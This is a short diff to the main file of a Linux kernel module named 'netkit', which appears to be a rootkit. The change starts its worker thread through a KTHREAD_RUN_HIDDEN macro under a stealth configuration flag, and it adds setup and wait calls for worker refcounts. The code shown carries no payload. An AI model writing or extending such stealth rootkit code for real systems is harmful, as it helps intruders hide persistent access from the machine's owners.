@@ -5,10 +5,9 @@
 #include <linux/crypto.h>
 
 #include "netkit.h"
-
 #include "stealth/iface.h"
 #include "io/iface.h"
-#include "sys/debug.h"
+#include "sys/lock.h"
 
 static int netkit_main(void* args)
 {
@@ -16,6 +15,9 @@ static int netkit_main(void* args)
     int retv;
 
     NETKIT_LOG("[+] module started (debug: %d)\n", CONFIG_NETKIT_DEBUG);
+
+    // sets up worker refcounts
+    netkit_workers_init();
 
 #if CONFIG_NETKIT_STEALTH
     NETKIT_LOG("[*] waiting for module to be ready...\n");
@@ -44,7 +46,7 @@ static int __init netkit_init(void)
 {
 #if CONFIG_NETKIT_STEALTH
     // be able to delete things required by the module loader post THIS_MODULE->init()
-    kthread_run(netkit_main, NULL, "netkit-main");
+    KTHREAD_RUN_HIDDEN(netkit_main, NULL, "netkit-main");
 #else
     netkit_main(NULL);
 #endif
@@ -61,6 +63,9 @@ static void __exit netkit_exit(void)
 #if CONFIG_NETKIT_STEALTH
     stealth_exit();
 #endif
+
+    NETKIT_LOG("[*] waiting for workers to exit...\n");
+    netkit_workers_wait();
 
     NETKIT_LOG("[*] finished exiting module (^-^)7\n");
 }
